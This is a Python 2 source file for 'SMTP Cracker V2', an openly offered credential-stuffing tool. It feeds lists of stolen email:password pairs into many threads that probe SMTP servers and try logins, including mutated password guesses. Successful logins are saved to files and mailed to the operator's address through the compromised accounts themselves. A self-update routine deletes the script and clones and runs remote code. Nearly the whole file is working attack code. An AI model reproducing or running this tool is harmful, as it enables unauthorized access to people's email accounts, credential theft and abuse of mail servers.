#!/usr/bin/env python
# -*- coding: utf-8 -*-
#Coded By ARON-TN
#Don't Change copyright Mother Fucker :)
#Tunisia Coderz
#Tool Finished In : 01:22 10/03/2019
import os,socket,threading,base64,datetime,sys,ssl,imaplib,time,re
msg0 ="\n\033[91m########## verified Your modules ########"
for i in msg0:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.1)
try: 
 import emoji
except:
  print"\033[91m[\033[92m?\033[91m] Installing emoji Module\033[00m"
  if os.name=='nt':
    try:
      os.system('C:\Python27\Scripts\pip2.exe install emoji')
      import emoji
    except:
      sys.exit("\n\033[91m[\033[92m?\033[91m] \033[91mInstall Python-Pip Sir Before use tool !\033[00m")
  else:
    try:
      os.system('pip2 install emoji')
      import emoji
    except:
      print "\033[91m[\033[92m?\033[91m] \033[91mTry To Install pip2 For Your Devices And Try 'root@usr:~$ pip2 install emoji'\033[00m"
try: 
 import Queue
except:
  print"\033[91m[\033[92m?\033[91m] Installing Queue Module\033[00m"
  if os.name=='nt':
    try:
      os.system('C:\Python27\Scripts\pip2.exe install Queue')
      import Queue
    except:
      print "Install Python-Pip Sir"
      raw_input('')
  else:
    try:
      os.system('pip2 install Queue')
      import Queue
    except:
      print "\033[91mTry To Install pip2 For Your Devices And Try 'root@usr:~$ pip2 install Queue'\033[00m"
try:
 import requests
except:
  print"\033[91m[\033[92m?\033[91m] Installing requests Module\033[00m"
  if os.name=='nt':
    try:
      os.system('cd:\Python27\Scripts\pip2.exe install requests')
    except:
      print "Install Python-Pip Sir"
      raw_input('')
  else:
    os.system('pip2 install requests')
try:
 import requests
except:
  print"\033[91m[\033[92m?\033[91m] Installing colorama Module\033[00m"
  if os.name=='nt':
    try:
      os.system('cd:\Python27\Scripts\pip2.exe install colorama')
    except:
      print "Install Python-Pip Sir"
      raw_input('')
  else:
    os.system('pip2 install colorama')
msg00 ="\n\033[91m##### GOOd Now You have all modules #####\n############## Let's start ##############"
for i in msg00:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.1)
to_check={}
print '\033[1m'
class IMAP4_SSL(imaplib.IMAP4_SSL):
    def __init__(self, host='', port=imaplib.IMAP4_SSL_PORT, keyfile=None, 
                 certfile=None, ssl_version=None, ca_certs=None, 
                 ssl_ciphers=None,timeout=40):
       self.ssl_version = ssl_version
       self.ca_certs = ca_certs
       self.ssl_ciphers = ssl_ciphers
       self.timeout=timeout
       imaplib.IMAP4_SSL.__init__(self, host, port, keyfile, certfile)
    def open(self, host='', port=imaplib.IMAP4_SSL_PORT):
       self.host = host
       self.port = port
       self.sock = socket.create_connection((host, port),self.timeout)
       extra_args = {}
       if self.ssl_version:
           extra_args['ssl_version'] = self.ssl_version
       if self.ca_certs:
           extra_args['cert_reqs'] = ssl.CERT_REQUIRED
           extra_args['ca_certs'] = self.ca_certs
       if self.ssl_ciphers:
           extra_args['ciphers'] = self.ssl_ciphers
       self.sslobj = ssl.wrap_socket(self.sock, self.keyfile, self.certfile, 
                                     **extra_args)
       self.file = self.sslobj.makefile('rb')
class checkerr(threading.Thread):
	def __init__(self,host,user,pwd,timeout,interval):
		t=threading.Thread.__init__(self)
		self.host=host
		self.user=user
		self.pwd=pwd
		self.interval=interval
		self.timeout=timeout
		self.connected=False
		self.i=None
		self.work=True
		self.attemp=4
		self.inbox=''
		self.spam=''
	def connect(self):
		try:
			i=IMAP4_SSL(host=self.host,port=993)
			i.login(self.user,self.pwd)
			self.i=i
			self.connected=True
		except Exception,e:
			print str(e)
			i.close()
			self.connected=False
	def find(self):
		global to_check
		if self.inbox=='':
			rez,folders=self.i.list()
			for f in folders:
				if '"|" ' in f:
					a=f.split('"|" ')
				elif '"/" ' in f:
					a=f.split('"/" ')
				folder=a[1].replace('"','')
				if self.inbox=="":
					if 'inbox' in folder.lower():
						self.inbox=folder
				elif self.spam=="":
					if 'spam' in folder.lower():
						self.spam=folder
			if self.spam=='':
				for f in folders:
					if '"|" ' in f:
						a=f.split('"|" ')
					elif '"/" ' in f:
						a=f.split('"/" ')
					folder=a[1].replace('"','')
					if self.spam=="":
						if 'trash' in folder:
							self.spam=folder
					else:
						break
		print '\033[91m[\033[92m+\033[91m]\033[92mChecking for emails\033[00m\n'
		self.i.select(self.inbox)
		found=[]
		for k,t in enumerate(to_check):
			rez=self.i.search(None,'SUBJECT',t[0])
			times=time.time()-t[1]
			if times-2>self.timeout:
				save=open('checked_smtp.txt','a').write(t[0]+"| NOTFOUND | %.2f sec\n"%times)
				found.append(k)
			if len(rez)>0:
				save=open('checked_smtp.txt','a').write(t[0]+"| INBOX | %.2f sec\n"%times)
				found.append(k)
		self.i.select(self.spam)
		for k,t in enumerate(to_check):
			rez=self.i.search(None,'SUBJECT',t[0])
			times=time.time()-t[1]
			if times-2>self.timeout:
				save=open('checked_smtps.txt','a').write(t[0]+"| NOTFOUND | %.2f sec\n"%times)
				found.append(k)
			if len(rez)>0:
				save=open('checked_smtp.txt','a').write(t[0]+"| SPAM | %.2f sec\n"%times)
				found.append(k)
		new=[]
		for k,v in enumerate(to_check):
			if k not in found:
				new.append(v)
		to_check=new
		print to_check
	def run(self):
		global to_checks
		while self.work:
			if not self.connected:
				if self.attemp<=0:
					return 0
				self.connect()
				self.attemp-=1
			if len(to_check)>0:
				self.find()
			time.sleep(self.interval)
def tld2(dom):
		global tlds
		if "." not in dom:
			return ""
		dom=dom.lower()
		parts=dom.split(".")
		if len(parts)<2 or parts[0]=="" or parts[1]=="":
			return ""
		tmp=parts[-1]
		for i,j in enumerate(parts[::-1][1:5]):
			try:
				tmp=tlds[tmp]
				tmp=j+"."+tmp
			except:
				if i==0:
					return ""
				return tmp
		return tmp		
class consumer(threading.Thread):
	def __init__(self,qu):
		threading.Thread.__init__(self)
		self.q=qu
		self.hosts=["","smtp.","mail.","webmail.","secure.","plus.smtp.","smtp.mail.","smtp.att.","pop3.","securesmtp.","outgoing.","smtp-mail.","plus.smtp.mail.","Smtpauths.","Smtpauth."]
		self.ports=[587,465,25]
		self.timeout=13
	def sendCmd(self,sock,cmd):
		sock.send(cmd+"\r\n")
		return sock.recv(900000)
	def addBad(self,ip):
		global bads,rbads
		if rbads:
			save=open('trash.txt','a').write(ip+'\n')
			bads.append(ip)
		return -1
	def findHost(self,host):
		global cache,bads,rbads
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.setblocking(0)
		s.settimeout(self.timeout)
		try:
			d=cache[host]
			try:
				if self.ports[d[1]]==465:
					s=ssl.wrap_socket(s)
				s.connect((self.hosts[d[0]]+host,self.ports[d[1]]))
				return s
			except Exception,e:
				if rbads:
					bads.append(host)
					save=open('trash.txt','a').write(host+'\n')
				return None
		except KeyError:
			pass
		print '\033[91m[\033[92m*\033[91m]\033[92mSearching smtp host and port on\033[00m '+host+'\n'
		cache[host]=[-1,-1]
		for i,p in enumerate(self.ports):
			for j,h in enumerate(self.hosts):
				try:
					print '\033[91m[\033[92m*\033[91m]\033[92mTrying connection on\033[00m '+h+host+':'+str(p)+'\n'
					s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
					s.setblocking(0)
					s.settimeout(self.timeout)
					if p==465:
						s=ssl.wrap_socket(s)
					s.connect((h+host,p))
					cache[host]=[j,i]
					return s
				except Exception,e:
					continue
		bads.append(host)
		del cache[host]
		save=open('trash.txt','a').write(host+'\n')
		return None
	def getPass(self,passw,user,domain):
		passw=str(passw)
		if '%null%' in passw:
			return ""
		elif '%user%' in passw:
			user=user.replace('-','').replace('.','').replace('_','')
			return passw.replace('%user%',user)
		elif '%User%' in user:
			user=user.replace('-','').replace('.','').replace('_','')
			return passw.replace('%User%',user)
		elif '%special%' in user:
			user=user.replace('-','').replace('.','').replace('_','').replace('e','3').replace('i','1').replace('a','@')
			return passw.replace('%special%',user)
		elif '%domain%' in passw:
			return passw.replace('%domain%',domain.replace("-",""))
		if '%part' in passw:
			if '-' in user:
				parts=user.split('-')
			elif '.' in user:
				parts=user.split('.')
			elif '_' in user:
				parts=user.split('_')
			print parts				
			try:
				h=passw.replace('%part','').split('%')[0]
				i=int(h)
				p=passw.replace('%part'+str(i)+'%',parts[i-1])
				return p
			except Exception,e:
				return None
		return passw
	def connect(self,tupple,ssl=False):
		global bads,cracked,cache,email,successful
		host=tupple[0].rstrip()
		host1=host
		user=tupple[1].rstrip()
		if host1 in cracked or host1 in bads:
			return 0
		passw=self.getPass(tupple[2].rstrip(),user.rstrip().split('@')[0],host.rstrip().split('.')[0])
		if passw==None:
			return 0
		try:
			if cache[host][0]==-1:
				return 0
		except KeyError:
			pass
		s=self.findHost(host)
		if s==None:
			return -1
		port=str(self.ports[cache[host][1]])
		if port=="465":
			port+="(SSL)"
		host=self.hosts[cache[host][0]]+host
		print '\033[91m[\033[92m*\033[91m]\033[92mTrying >\033[00m '+host+":"+port+" "+user+" "+passw+'\n'
		try:
			banner=s.recv(1024)
			if banner[0:3]!="220":
				self.sendCmd(s,'QUIT')
				s.close()
				return self.addBad(host1)
			rez=self.sendCmd(s,"EHLO ADMIN")
			rez=self.sendCmd(s,"AUTH LOGIN")
			if rez[0:3]!='334':
				self.sendCmd(s,'QUIT')
				s.close()
				return self.addBad(host1)
			rez=self.sendCmd(s,base64.b64encode(user))
			if rez[0:3]!='334':
				self.sendCmd(s,'QUIT')
				s.close()
				return self.addBad(host1)
			rez=self.sendCmd(s,base64.b64encode(passw))
			if rez[0:3]!="235" or 'fail' in rez:
				self.sendCmd(s,'QUIT')
				s.close()
				return 0
			print '\n\033[93m[\033[90m>\033[00m]\033[91m B\033[94m0\033[95mM\033[92m \033[93mC\033[90mr\033[92ma\033[94mC\033[91mke\033[94md \033[92m>\033[90m  '+host+':'+port+' '+user+' '+passw+'\n'
			save=open('cracked_smtps.txt','a').write(host+":"+port+","+user+","+passw+"\n")
			save=open('cracked_Mailaccess.txt','a').write(user+":"+passw+"\n")
			cracked.append(host1)
			rez=self.sendCmd(s,"RSET")
			if rez[0:3]!='250':
				self.sendCmd(s,'QUIT')
				s.close()
				return self.addBad(host1)
			rez=self.sendCmd(s,"MAIL FROM: <"+user+">")
			print rez
			if rez[0:3]!='250':
				self.sendCmd(s,'QUIT')
				s.close()
				return self.addBad(host1)
			rez=self.sendCmd(s,"RCPT TO: <"+email+">")
			if rez[0:3]!='250':
				self.sendCmd(s,'QUIT')
				s.close()
				return self.addBad(host1)
			rez=self.sendCmd(s,'DATA')
			headers='From: 👻 SMTP CRACKER V2 👻 <'+user+'> \r\n'
			headers+='To: '+email+'\r\n'
			headers+='Subject:New Smtp Result By ARON-TN\r\n'
			headers+='MIME-Version: 1.0\r\n'
			headers+='Content-Transfer-encoding: 8bit\r\n'
			headers+="Content-type: text/html; charset=utf-8\r\n";
			headers+='Return-Path: %s\r\n'%user
			headers+='X-Priority: 1\r\n'
			headers+='X-MSmail-Priority: High\r\n'
			headers+='X-Mailer: Microsoft Office Outlook, Build 11.0.5510\r\n'
			headers+='X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441\r\n'
			headers+='''<html>
<head>
<meta charset="utf-8" >
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{font-family: "Trebuchet MS", Helvetica, sans-serif;}
</style>
</head>
<body>
<div class="main" style="background: -webkit-linear-gradient(green,#F3431D,green);
background: -moz-linear-gradient(green,#F3431D,green);
background: -o-linear-gradient(green,#F3431D,green);
            border: 1px solid #0B4A89;
            border-radius: 11px;
            color: #fff;">
<center><h1><i><font color="red">SMTP Cracker V2 </font><font color="blue">By ARON-TN</font></i></h1></center>         
<b>Hi, </b><br/><b>NEW SMTP RESULT  </b><br/><b> SMTP INFO : </b><br/>
<b>  Host : '''+host+'''</b><br/><b> Port : '''+port+'''<br>
  User  : '''+user+'''<br>
  Password  : '''+passw+'''<br><br><font color="blue"> /!\ WARNING /!\ <br> i don't accept any responsibility for any illegal usage !</font><br><br>
  Contact Coder(ARON-TN)  <br>  Email : aron.tn.official@gmail.com<br>  Facebook : <a href="https://www.facebook.com/amir.othman.official">Click HEre</a><br>
  Youtube : <a href="https://www.youtube.com/channel/UCuk4DSWDGxdZnHbrqVz0ZZA">Click HEre</a><br><font>� ARON-TN 2017-2019</font></b></body></html>'''
			s.send(headers)
			rez=s.recv(1000)
			self.sendCmd(s,'QUIT')
			s.close()
		except Exception,e:
			save=open('trash.txt','a').write(host+":"+port+":"+str(e)+"\n")
			s.close()
			return self.addBad(host1)
	def run(self):
		while True:
			cmb=self.q.get()
			self.connect(cmb)
			self.q.task_done()
quee=Queue.Queue(maxsize=20000)
try:
 save=open('about.txt','a').write('+++++++++++++\nCoded By ARON-TN \n contact me ! \n{!}facebook : https://www.facebook.com/amir.othman.official \n{!}youtube : https://www.youtube.com/channel/UCuk4DSWDGxdZnHbrqVz0ZZA \nCopyright ARON-TN 2k19\n+++++++++++++\n')
 tld=open('about.txt','r').read().splitlines()
except:
 sys.exit("\033[91m{!} about.txt not Founded :/ \n Please Create file.txt rename it to about.txt \n thnx For Using My Tool <3\033[00m")
tlds=cache={}
bads=[]
cracked=[]
rbads=0
try:
 inputs=open(sys.argv[1],'r').read().splitlines()
 thret=sys.argv[2]
 thret=200
except:
 print('''
   \033[90m_     _       \033[94m______   __       __  ________  _______      \033[90m_     _  
  (c).-.(c)     \033[94m/      \ /  \     /  |/        |/       \    \033[90m(c).-.(c)
   / ._. \     \033[94m/$$$$$$  |$$  \   /$$ |$$$$$$$$/ $$$$$$$  |    \033[90m/ ._. \ 
 __\( Y )/__   \033[94m$$ \__$$/ $$$  \ /$$$ |   $$ |   $$ |__$$ |  \033[90m__\( Y )/__ 
(_.-/'-'\-._)  \033[94m$$      \ $$$$  /$$$$ |   $$ |   $$    $$/  \033[90m(_.-/'-'\-._)
   || A ||      \033[94m$$$$$$  |$$ $$ $$/$$ |   $$ |   $$$$$$$/      \033[90m|| R ||
 _.' `-' '._   \033[94m/  \__$$ |$$ |$$$/ $$ |   $$ |   $$ |        \033[90m_.' `-' '._  
(.-./`-'\.-.)  \033[94m$$    $$/ $$ | $/  $$ |   $$ |   $$ |       \033[90m(.-./`-'\.-.) 
 `-'     `-'    \033[94m$$$$$$/  $$/      $$/    $$/    $$/         \033[90m`-'     `-'
                \033[91m[\033[92m+\033[91m]\033[93m(C)opyright > Github.com/ARON-TN\033[91m[\033[92m+\033[91m]
               \033[91m[\033[92m+\033[91m] SMTP CRACKER V2 CODED BY ARON-TN \033[91m[\033[92m+\033[91m]
              \033[91m[\033[92m+\033[91m]\033[92m EMail : aron.tn.official@gmail.com \033[91m[\033[92m+\033[91m]
             \033[91m[\033[92m+\033[91m]\033[93mFacebook > Fb.com/amir.othman.official\033[91m[\033[92m+\033[91m]
''')
 ms0g ="\n\033[93mChecking\033[0;96m Your\033[91m Version\033[92m ...\n\n"
 for i in ms0g:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.1)
 vers=requests.get('https://gist.githubusercontent.com/aron-tn/edecab7db5849e16fc9c77ad14eba0b3/raw/aaec54e2fa507c3afde04e2551cb639e3aaa7c03/gistfile1.txt').text.encode('utf-8')
 if vers=='ARON-TN@2.0@ARON-TN':
  print('\033[91mG\033[94mo\033[92mo\033[91md \033[94mY\033[92mo\033[91mu\033[94m H\033[92ma\033[92mv\033[91me\033[94m L\033[92ma\033[91ms\033[94mt\033[92m V\033[91me\033[94mr\033[92ms\033[91mi\033[94mo\033[92mn\033[91m \n')
 else:
  print("\033[91mThere IS NEW Version\033[94m :\ \033[92mDo you Want To Update it ? \033[00m")
  ok=raw_input('''
  \033[91m[\033[94m1\033[91m]\033[00m YEs
  \033[91m[\033[94m2\033[91m]\033[00m No
 \033[91m[\033[94m>\033[91m]\033[00m : ''')
  if ok=='1':
   os.remove(sys.argv[0])
   os.system('git clone https://github.com/aron-tn/SMTP-Mail.acess-Cracker-Checker && cd SMTP-Mail.acess-Cracker-Checker && python2 smtp.py')
  elif ok=='2':
   pass
 try:
  inputs=open(raw_input('\033[91m[\033[92m+\033[91m]\033[92m Combo Name : \033[93m'),'r').read().splitlines()
 except:
	sys.exit("\n\033[91m{!} Your File not Founded\033[00m")
 email=raw_input('\033[91m[\033[92m+\033[91m]\033[92m Enter Your Email : ')
 thret=200
def part():
	global tld,tlds
	for i in tld:
		tlds[i]=i
part()
msg ="\n\033[91mConnecting ..........."
for i in msg:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.2)
for i in range(int(thret)):
    try:
        t=consumer(quee)
        t.setDaemon(True)
        t.start()
    except:
		print "\033[91m{!} Working only with %s threads\033[00m"%i
		break
try:
	for i in inputs:
		user = i.split(':')[0]
		password = i.split(':')[1]
		user = user.lower()
		quee.put((user.split('@')[1], user, password))
except:
	pass
quee.join()
